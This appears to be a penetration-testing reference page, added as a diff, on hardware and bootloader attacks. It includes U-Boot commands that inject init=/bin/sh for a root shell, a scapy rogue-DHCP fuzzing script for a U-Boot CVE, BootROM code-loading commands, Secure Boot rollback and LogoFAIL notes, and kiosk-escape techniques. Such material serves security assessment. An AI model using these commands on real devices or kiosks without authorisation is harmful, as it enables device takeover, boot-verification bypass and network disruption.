@@ -1,0 +1,249 @@
+---
+title: "Hardware Hacking Tools & Bootloader Testing"
+description: "Reference guide to hardware hacking tools, U-Boot exploitation, UEFI/BIOS assessment, SoC ROM recovery modes, network-boot surface testing, and kiosk escape techniques."
+---
+
+## U-Boot Quick Wins and Environment Abuse
+
+U-Boot is the most common bootloader in embedded Linux devices. When you have UART access, U-Boot often provides an interactive shell with significant power.
+
+<Steps>
+  <Step title="Access the U-Boot Shell">
+    During boot, press a break key (often any key, `0`, space, or a board-specific sequence) before `bootcmd` executes.
+  </Step>
+  <Step title="Inspect Boot State">
+    ```bash
+    printenv          # Dump all environment variables
+    bdinfo            # Board info and memory addresses
+    help bootm        # Supported kernel boot methods
+    help ext4load     # Available file loaders
+    ```
+  </Step>
+  <Step title="Modify Boot Arguments for Root Shell">
+    ```bash
+    setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=squashfs init=/bin/sh'
+    saveenv
+    boot
+    ```
+  </Step>
+  <Step title="Netboot from TFTP Server">
+    ```bash
+    setenv ipaddr 192.168.2.2
+    setenv serverip 192.168.2.1
+    saveenv; reset
+    ping ${serverip}
+    tftpboot ${loadaddr} zImage
+    tftpboot ${fdt_addr_r} devicetree.dtb
+    setenv bootargs "${bootargs} init=/bin/sh"
+    booti ${loadaddr} - ${fdt_addr_r}
+    ```
+  </Step>
+  <Step title="Persist Changes via Environment">
+    ```bash
+    setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
+    saveenv
+    ```
+    Check variables like `bootcount`, `bootlimit`, `altbootcmd` that influence fallback paths.
+  </Step>
+</Steps>
+
+### Signature Verification Testing
+
+```bash
+# Test unsigned image (should FAIL if FIT signature is enforced)
+tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}
+
+# Test signed image with bad hash (should FAIL)
+tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr}
+
+# Test valid signed image (should succeed)
+tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}
+```
+
+Absence of `CONFIG_FIT_SIGNATURE` or legacy `verify=n` behavior often allows booting arbitrary payloads.
+
+## Network-Boot Surface Testing (DHCP/PXE)
+
+### CVE-2024-42040 — U-Boot DHCP Memory Disclosure
+
+U-Boot's legacy BOOTP/DHCP handling can leak memory via crafted DHCP responses. Fuzz the code paths:
+
+```python
+from scapy.all import *
+
+offer = (
+    Ether(dst='ff:ff:ff:ff:ff:ff') /
+    IP(src='192.168.2.1', dst='255.255.255.255') /
+    UDP(sport=67, dport=68) /
+    BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1',
+          chaddr=b'\xaa\xbb\xcc\xdd\xee\xff') /
+    DHCP(options=[
+        ('message-type', 'offer'),
+        ('server_id', '192.168.2.1'),
+        ('bootfile_name', 'A' * 300),    # Intentionally oversized
+        ('vendor_class_id', 'B' * 240),
+        'end'
+    ])
+)
+sendp(offer, iface='eth0', loop=1, inter=0.2)
+```
+
+<Warning>
+Always isolate the lab network before running rogue DHCP/PXE servers to avoid disrupting production networks.
+</Warning>
+
+## SoC ROM Recovery Modes
+
+Many SoCs expose a BootROM loader mode that accepts code over USB/UART even when flash images are invalid. If secure-boot fuses are not blown, this can provide arbitrary code execution early in the boot chain.
+
+<CardGroup cols={3}>
+  <Card title="NXP i.MX (Serial Download)" icon="microchip">
+    Tools: `uuu` (mfgtools3), `imx-usb-loader`
+    ```bash
+    imx-usb-loader u-boot.imx
+    ```
+  </Card>
+  <Card title="Allwinner (FEL)" icon="sun">
+    Tool: `sunxi-fel`
+    ```bash
+    sunxi-fel -v uboot u-boot-sunxi-with-spl.bin
+    # Or write and execute manually:
+    sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin
+    sunxi-fel exe 0x4A000000
+    ```
+  </Card>
+  <Card title="Rockchip (MaskROM)" icon="chip">
+    Tool: `rkdeveloptool`
+    ```bash
+    rkdeveloptool db loader.bin
+    rkdeveloptool ul u-boot.bin
+    ```
+  </Card>
+</CardGroup>
+
+Assess whether secure-boot eFuses/OTP are burned. If not, BootROM download modes frequently bypass all higher-level verification.
+
+## UEFI / PC-Class Bootloader Testing
+
+### ESP Tampering and Rollback
+
+```bash
+# Mount EFI System Partition and check loader components
+ls /boot/efi/EFI/
+# EFI/Microsoft/Boot/bootmgfw.efi
+# EFI/BOOT/BOOTX64.efi
+# EFI/ubuntu/shimx64.efi
+
+# Try booting with downgraded signed components if Secure Boot
+# revocations (dbx) are not current
+```
+
+### LogoFAIL Class Vulnerabilities
+
+Several OEM firmwares were vulnerable to image-parsing flaws in DXE that process boot logos. If an attacker can place a crafted image on the ESP under a vendor-specific path (e.g., `\EFI\<vendor>\logo\*.bmp`), code execution during early boot may be possible even with Secure Boot enabled.
+
+Test whether the platform accepts user-supplied logos and whether those paths are writable from the OS.
+
+## U-Boot Environment Tips
+
+```bash
+# Move environment blobs between RAM and storage
+env export -t ${loadaddr}
+env import -t ${loadaddr}
+
+# For systems booting via extlinux.conf:
+# Modify the APPEND line to inject init=/bin/sh or rd.break
+# when no signature checks are enforced on the boot partition
+
+# Validate fw_env.config matches real env storage
+fw_printenv
+fw_setenv bootargs 'init=/bin/sh'
+```
+
+## Kiosk / GUI Escape Techniques
+
+### Physical Interface Abuse
+
+| Component | Attack |
+|---|---|
+| Power button | Reboot may expose start screen |
+| USB ports | Connect keyboard with more shortcuts |
+| Ethernet | Network scan or sniffing for further exploitation |
+
+### Common Dialog Exploitation (Windows)
+
+File dialogs (`Open`, `Save As`, `Print`) often provide full Explorer functionality. From these dialogs:
+
+- Navigate to `%WINDIR%\System32\cmd.exe` and execute it
+- Create a new file, rename it `.CMD` or `.BAT`
+- Create a shortcut pointing to `cmd.exe`
+- Use **drag and drop** onto `cmd.exe` to launch a prompt
+
+```cmd
+# Find writable staging paths
+echo %TEMP%
+accesschk.exe -uwdqs Users c:\
+accesschk.exe -uwdqs "Authenticated Users" c:\
+```
+
+### Windows Shortcuts (Kiosk Escape)
+
+| Shortcut | Action |
+|---|---|
+| `CTRL+N` | Open new session |
+| `CTRL+R` | Execute commands |
+| `CTRL+SHIFT+ESC` | Task Manager |
+| `Windows+E` | Windows Explorer |
+| `CTRL+O` | File/Open dialog |
+| `CTRL+S` | Save As dialog |
+| `SHIFT+F10` | Context menu |
+
+### Shell URIs (Windows/IE)
+
+Type these in address bars to get Explorer-like access:
+
+```
+shell:Administrative Tools
+shell:DocumentsLibrary
+shell:UserProfiles
+shell:::{20D04FE0-3AEA-1069-A2D8-08002B30309D}   # My Computer
+shell:::{21EC2020-3AEA-1069-A2DD-08002B30309D}   # Control Panel
+```
+
+### Browser-Based Filesystem Access (Windows)
+
+```
+File:/C:/windows
+File:/C:\windows
+File://C:/windows
+%WINDIR%
+%TEMP%
+%SYSTEMROOT%
+```
+
+### GTFOBins & LOLBas for Execution
+
+- **Windows:** [https://lolbas-project.github.io/](https://lolbas-project.github.io/) — trusted binaries that can execute code
+- **Linux/macOS:** [https://gtfobins.github.io/](https://gtfobins.github.io/) — `bash`, `sh`, `python`, editors
+
+### iPad Gesture Escapes
+
+- **Swipe left side to right:** View all open Windows, minimize KIOSK app
+- **Swipe right side to left:** Open Action Center, minimize KIOSK app
+- **Swipe up from bottom:** Show taskbar in fullscreen app
+- **Four/five finger swipe up:** Multitask view
+
+## Hardware Caution
+
+<Warning>
+Be cautious when interacting with SPI/NAND flash during early boot (e.g., grounding pins to bypass reads). Always consult the flash datasheet. Mistimed shorts can corrupt the device or the programmer.
+</Warning>
+
+## References
+
+- [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
+- [LogoFAIL — Dangers of Image Parsing During Boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
+- [CVE-2024-42040 — U-Boot DHCP Memory Disclosure](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
+- [Breaking out of Citrix and other Restricted Desktop Environments](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)
+- [LOLBAS Project](https://lolbas-project.github.io/)
+- [GTFOBins](https://gtfobins.github.io/)
